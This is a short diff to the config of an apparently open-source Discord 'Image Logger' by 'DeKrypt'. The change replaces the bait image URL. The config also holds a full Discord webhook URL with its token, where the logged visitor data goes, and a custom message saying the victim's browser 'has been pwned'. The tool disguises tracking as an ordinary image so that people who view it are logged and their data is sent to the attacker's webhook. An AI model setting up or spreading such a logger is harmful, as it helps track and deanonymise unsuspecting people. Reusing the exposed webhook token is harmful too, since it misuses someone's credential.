@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1336509723738116217/gtY5mw_IbnwelBYRBQv1V3Xzl5PY6Y4zmcgnCG8GzSRS1s1bHWbTdVWnsorjfbaK8h1o",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaLkUTGFC4N5JDOqLEskHfK1o00imO1epcb_8nWMVkTyvW6MZGb7EGejx77Of4BdJeO_g&usqp=CAU",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTgJWiXRiKY9Slqahy1j8vBMweFyLxYBi0B4g&s",
         "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
